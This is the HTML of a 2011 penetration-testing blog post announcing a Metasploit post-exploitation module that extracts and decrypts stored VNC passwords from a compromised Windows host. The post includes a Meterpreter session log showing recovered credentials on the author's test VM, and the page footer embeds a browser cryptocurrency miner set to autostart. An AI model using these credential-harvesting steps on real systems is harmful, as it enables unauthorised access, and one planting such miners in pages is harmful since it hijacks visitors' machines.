@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> Metasploit VNC Password Extraction &middot;  </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.41" />
+
+
+<script   src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://malicious.link/css/nix.css">
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata|Open+Sans|Roboto|Montserrat|Concert+One" rel="stylesheet">
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+				  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-198967-1', 'auto');
+	  ga('send', 'pageview');
+
+</script>
+
+
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" id="green-terminal" href=https://malicious.link/>mubix@malicious.link ~ $</a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				<li>
+					<a href="https://malicious.link/">/home/mubix</a>
+				</li>
+
+				
+				
+				<li >
+					<a href="/brandon">~/brandon</a>
+				</li>
+				
+				
+				<li >
+					<a href="/about">~/about</a>
+				</li>
+				
+				
+				<li >
+					<a href="/post">~/posts</a>
+				</li>
+				
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="container wrapper">
+            <h1><a href="https://malicious.link/post/2011/2011-03-21-metasploit-vnc-password-extraction/">Metasploit VNC Password Extraction</a></h1>
+            <span class="post-date">Mar 21, 2011 </span>
+            <div class="post-content">
+                <p><a href="http://carnal0wnage.blogspot.com/2011/03/vnc-passwords-and-metasploit-and-des.html">Chris Gates wrote a blog post</a> about the &lsquo;getvncpw&rsquo; meterpreter script. I ran into the same issue on Penetration Tests in the past but didn&rsquo;t know much about the wacked out version of DES that RFB (the VNC protocol) was using. Not being a fan of manually editing a binary and compiling each time I had a password to crack I wanted to find another way, but didn&rsquo;t get a chance to.</p>
+
+<p>Yesterday I saw this ticket: <a href="https://www.metasploit.com/redmine/issues/3183">https://www.metasploit.com/redmine/issues/3183</a> and thought to myself: &ldquo;Thats definitely within my coding ability to contribute a patch for&rdquo;. After almost 15 hours of coding between 9 pm on Saturday and 8 pm on Sunday. It went far and beyond just adding in a bit of code to support UltraVNC.</p>
+
+<p>changelog:</p>
+
+<ul>
+<li>Complete rewrite as a post module instead of a meterpreter script</li>
+<li>Passwords of less than 8 characters are correctly padded (<a href="https://www.metasploit.com/redmine/projects/framework/repository/revisions/12033">thanks jduck</a>)</li>
+<li>UltraVNC checks added</li>
+<li>TightVNC checks added for both VNC and it&rsquo;s control console</li>
+<li>Made it very simple to add new checks in either the registry or in a file</li>
+<li>Output is a bit more verbose (lets you know something is happening</li>
+<li>Reports authentication credentials found to database</li>
+<li>Identifies the port that VNC is running on as well</li>
+</ul>
+
+<p>It isn&rsquo;t in the metasploit trunk so until/if if gets added you can get it here:</p>
+
+<p><a href="https://gist.github.com/mubix/8215705">enum_vnc_pw.rb</a></p>
+
+<p>If you have a check, find it breaks for some reason or another, or just want to tell me that I suck, please leave a comment or email me.</p>
+
+<p>Here it is in action against my VM with 3 different VNC servers on it (calling the post module in two separate ways) :</p>
+
+<pre><code>msf exploit(handler) &gt; sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter &gt; getuid
+Server username: XPBASELINEAdministrator
+meterpreter &gt; background
+msf exploit(handler) &gt; use post/windows/gather/enum_vnc_pw 
+msf post(enum_vnc_pw) &gt; set SESSION 1
+SESSION =&gt; 1
+msf post(enum_vnc_pw) &gt; show options
+
+Module options (post/windows/gather/enum_vnc_pw):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+
+msf post(enum_vnc_pw) &gt; run
+
+[*] Enumerating VNC passwords on XPBASELINE
+[*] Checking UltraVNC...
+[+] UltraVNC =&gt; A85B4C5976979DE93B =&gt; thisismy on port: 5900
+[+] VIEW ONLY: UltraVNC =&gt; DE2C1BA7393F6708B3 =&gt; 111 on port: 5900
+[*] Checking WinVNC3_HKLM...
+[*] Checking WinVNC3_HKCU...
+[*] Checking WinVNC3_HKLM_Default...
+[*] Checking WinVNC3_HKCU_Default...
+[*] Checking WinVNC_HKLM_Default...
+[*] Checking WinVNC_HKCU_Default...
+[*] Checking WinVNC4_HKLM...
+[+] WinVNC4_HKLM =&gt; c777b2de337a91cf =&gt; mypasswo on port: 5900
+[*] Checking WinVNC4_HKCU...
+[*] Checking RealVNC_HKLM...
+[*] Checking RealVNC_HKCU...
+[*] Checking TightVNC_HKLM...
+[+] TightVNC_HKLM =&gt; 7ebf1e76f732459f =&gt; authpass on port: 5900
+[*] Checking TightVNC_HKLM_Control_pass...
+[+] TightVNC_HKLM_Control_pass =&gt; f0299fd0e927cf2f =&gt; adminpas on port: 5900
+[*] Post module execution completed
+
+msf post(enum_vnc_pw) &gt; sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter &gt; run post/windows/gather/enum_vnc_pw 
+
+[*] Enumerating VNC passwords on XPBASELINE
+[*] Checking UltraVNC...
+[+] UltraVNC =&gt; A85B4C5976979DE93B =&gt; thisismy on port: 5900
+[+] VIEW ONLY: UltraVNC =&gt; DE2C1BA7393F6708B3 =&gt; 111 on port: 5900
+[*] Checking WinVNC3_HKLM...
+[*] Checking WinVNC3_HKCU...
+[*] Checking WinVNC3_HKLM_Default...
+[*] Checking WinVNC3_HKCU_Default...
+[*] Checking WinVNC_HKLM_Default...
+[*] Checking WinVNC_HKCU_Default...
+[*] Checking WinVNC4_HKLM...
+[+] WinVNC4_HKLM =&gt; c777b2de337a91cf =&gt; mypasswo on port: 5900
+[*] Checking WinVNC4_HKCU...
+[*] Checking RealVNC_HKLM...
+[*] Checking RealVNC_HKCU...
+[*] Checking TightVNC_HKLM...
+[+] TightVNC_HKLM =&gt; 7ebf1e76f732459f =&gt; authpass on port: 5900
+[*] Checking TightVNC_HKLM_Control_pass...
+[+] TightVNC_HKLM_Control_pass =&gt; f0299fd0e927cf2f =&gt; adminpas on port: 5900
+meterpreter &gt; 
+</code></pre>
+
+            </div>
+            
+            <div class="post-comments">
+                
+            </div>
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>
+	<center>
+	<b>If you wish to support this blog, please consider clicking start for a little bit. Thanks!</b>
+	<br />
+	<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+	<div class="coinhive-miner"
+	style="width: 800px; height: 80px"
+	data-key="Fq2psjl0HfUkdM4LuKrCulHymNpmFuXb"
+	data-whitelabel="true"
+	data-text="#000000"
+	data-background="#F5F5F5"
+	data-user="blog"
+	data-autostart="true"
+	>
+	<em>Loading...</em>
+	</div>
+	</center>
+</p>
+<p>Copyright &copy; 2018 Malicious.Link -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+
+</footer>
+
+    </body>
